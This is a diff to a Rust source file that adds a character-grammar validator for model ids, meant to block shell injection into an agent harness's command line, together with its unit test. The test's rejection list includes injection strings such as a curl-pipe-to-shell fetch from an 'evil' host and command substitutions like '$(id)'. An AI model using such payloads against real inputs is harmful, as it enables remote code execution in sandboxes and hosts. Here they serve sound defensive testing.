@@ -59,6 +59,34 @@ use talaria_secretbox::SecretBox;
 /// `talaria_workbench_harnesses::OmpRoles`.
 pub const ROLES: [&str; 4] = ["default", "smol", "slow", "plan"];
 
+/// The grammar a model id must fit before a route writes it anywhere:
+/// `^[A-Za-z0-9][A-Za-z0-9._:/-]{0,199}$`.
+///
+/// WHY A GRAMMAR AND NOT A LENGTH. A role pick and a ticket pin both end up
+/// ON THE INVOCATION LINE the harness is told to run (`--model <id>`, the
+/// inline `PI_*_MODEL=` assignments), so a value with shell metacharacters
+/// was a command injected into a Developer Agent's sandbox by whoever could
+/// reach the route. The line is also shell-quoted downstream; this is the
+/// first fence, not the only one. The charset is the gateway's own model-id
+/// vocabulary (`anthropic/claude-opus-4-5`, `qwen3:14b`, `gpt-5.1`), nothing
+/// a real provider id needs is missing from it.
+pub fn valid_model_id(s: &str) -> bool {
+    let bytes = s.as_bytes();
+    if bytes.is_empty() || bytes.len() > 200 {
+        return false;
+    }
+    if !bytes[0].is_ascii_alphanumeric() {
+        return false;
+    }
+    bytes[1..]
+        .iter()
+        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b':' | b'/' | b'-'))
+}
+
+/// The sentence a route answers a model id that fails [`valid_model_id`].
+pub const MODEL_ID_RULE: &str =
+    "model must be a model id: letters, digits, '.', '_', ':', '/' or '-', up to 200 characters";
+
 /// Whether the feature is available at all.
 pub const SETTING_ENABLED: &str = "coding_accounts.enabled";
 /// Which services an org permits — a list of omp store-provider ids. Absent
@@ -972,6 +1000,39 @@ mod tests {
     #[test]
     fn the_roles_are_omps_four_in_ui_order() {
         assert_eq!(ROLES, ["default", "smol", "slow", "plan"]);
+    }
+
+    #[test]
+    fn a_model_id_is_the_gateway_vocabulary_and_nothing_a_shell_reads() {
+        for ok in [
+            "qwen3:14b",
+            "anthropic/claude-opus-4-5",
+            "gpt-5.1",
+            "pl-main",
+            "a",
+            "Z9._:/-",
+        ] {
+            assert!(valid_model_id(ok), "{ok}");
+        }
+        for bad in [
+            "",
+            " x",
+            "-leading-dash",
+            ".hidden",
+            "/abs",
+            "x; curl https://evil/p.sh | sh; #",
+            "x y",
+            "x\n",
+            "$(id)",
+            "x`id`",
+            "x'y",
+            "x\"y",
+            "modèle",
+        ] {
+            assert!(!valid_model_id(bad), "{bad:?}");
+        }
+        assert!(valid_model_id(&"a".repeat(200)));
+        assert!(!valid_model_id(&"a".repeat(201)));
     }
 
     #[test]
